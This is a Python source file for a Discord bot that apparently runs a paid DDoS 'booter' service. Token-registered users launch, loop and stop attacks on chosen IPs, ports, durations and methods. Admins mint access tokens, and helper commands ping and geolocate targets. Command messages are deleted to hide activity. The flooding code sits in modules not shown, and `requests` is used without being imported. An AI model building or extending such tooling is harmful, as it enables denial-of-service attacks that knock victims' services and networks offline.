import inspect
import sys
import time
import discord
from discord.ext import commands
from ping3 import ping as pingIP
from data.attack import Attack
from data.user import Plan
from src import client, jsonutils, userutils
from threading import Thread
intents = discord.Intents().all()
#bot = commands.Bot(command_prefix='$pk.', intents=intents)
configData = jsonutils.load_config()
attackClient = client.AttackClient(config=configData)

bot = commands.Bot(command_prefix=configData.prefix, intents=intents, case_insensitive=True)
#bot.remove_commands("help")

@bot.event
async def on_message(self, message):
    global configData
    configData = jsonutils.load_config()
    if userutils.is_active(message.author.id):
        if (await bot.get_context(message)).valid:
            await bot.process_commands(message)
            try: await message.delete()
            except: pass

    elif f"{configData.prefix}register" in message.content: await bot.process_commands(message)

class Main:
    @bot.command(aliases=["loop"])
    async def start(ctx, ip: str = None, port: int = None, arg1: str = None, arg2: str = None):
        userPlan = Plan(**userutils.gather_user(ctx.message.author.id)[0])
        atkObj = Attack(IP=ip, Port=port, User=userPlan)
        
        cmd = ctx.message.content.lower().split(" ")
        clientRes: str = None

        if cmd[0] == f"{configData.prefix}start": 
            atkObj.Port = int(arg1)
            atkObj.Time = int(arg2)
            clientRes = attackClient.attack(atkObj)
        elif cmd[0] == f"{configData.prefix}loop": 
            atkObj.Time = configData.api.MaxTime
            atkObj.Method = arg1
            clientRes = attackClient.start_loop(atkObj)
        else: 
            await ctx.send(
                inspect.cleandoc("""
                    **Usage (#1)**: `pk.start <ip> <port> <time> <method>`
                    **Usage (#2)**: `pk.loop <ip> <port> <method>`"""))

        await ctx.send(clientRes, delete_after=20)

    @bot.command(aliases=["stoploop"])
    async def stop(ctx, ip: str = None):
        userPlan = Plan(**userutils.gather_user(ctx.message.author.id)[0])
        atkObj = Attack(ip, User=userPlan)
        
        cmd = ctx.message.content.lower().split(" ")
        clientRes: str = None

        if cmd[0] == f"{configData.prefix}stop": clientRes = attackClient.stop(atkObj)
        elif cmd[0] == f"{configData.prefix}stoploop": clientRes = attackClient.stop_loop(atkObj)
        else: 
            await ctx.send(
                inspect.cleandoc("""
                    **Usage (#1)**: `pk.stop <ip>`
                    **Usage (#2)**: `pk.stoploop <ip>`"""))

        await ctx.send(clientRes, delete_after=20)

    @bot.command()
    @commands.check(userutils.is_admin)
    async def stopall(ctx):
        await ctx.send("**Stopping all.. please wait**", delete_after=20)
        await ctx.send(attackClient.stop_all(), delete_after=20)
    
class Tokens:
    @bot.command()
    async def register(ctx, token: str = None):
        await ctx.send(userutils.register(ctx.message, token), delete_after=20)

    @bot.command()
    @commands.check(userutils.is_admin)
    async def createtoken(ctx, days: int = 0, cons: int = 0):
        await ctx.send(userutils.token_gen(ctx, days, cons), delete_after=20)

class Misc:
    @bot.command()
    async def options(ctx):
        await ctx.send((inspect.cleandoc(f"""
            **[Main Commands]**
            `[PREFIX]start <ip> <port> <time> <method>`
            `[PREFIX]loop <ip> <port> <time> <method>`
            `[PREFIX]stoploop <ip>`
            `[PREFIX]stop <ip>`
            `[PREFIX]attacks - Lists your active atks`

            **[Register Command]**
            `[PREFIX]register <token>`
            
            **[Admin Commands]**
            `[PREFIX]createtoken <days> <cons> - Admin command` 
            `[PREFIX]stopall`
            
            **[Misc Commands]**
            `[PREFIX]options`
            `[PREFIX]geo <ip>`
            `[PREFIX]ping <ip>` """)).replace("[PREFIX]", configData.prefix), delete_after=20)

    @bot.command()
    async def ping(ctx, *args):
        if len(args) == 0: await ctx.send(f"**Correct usage:** `pk.ping [IPs]`", delete_after=20)

        for ip in args:
            checkPing = pingIP(ip)
            if checkPing == None: await ctx.send(f"**{ip} ping:** `NO REPLY`", delete_after=20)

            initPing = str(round(checkPing, 3)).split('.')[1]
            await ctx.send(f"**{ip} ping:** `{initPing} ms`", delete_after=20)

    @bot.command()
    async def geo(ctx, ip: str = None):
        if ip == None: await ctx.send(f"**Correct usage:** `pk.g [IP]`", delete_after=20)

        geoUrl = configData.urls.GEOIP % (ip)
        geoRes = requests.get(geoUrl).json()

        await ctx.send(inspect.cleandoc(f"""
            __**GEO LOCATION RESULTS**__

            **IP:** `{geoRes['query']}`
            **Country:** `{geoRes['country']}`
            **City:** `{geoRes['city']}`
            **ISP:** `{geoRes['isp']}` """), delete_after=20)

@bot.event
async def on_ready():
    print('Bot online')

Thread(target=attackClient._manage_active).start()
Thread(target=attackClient._manage_loop).start()

bot.run(configData.botToken)
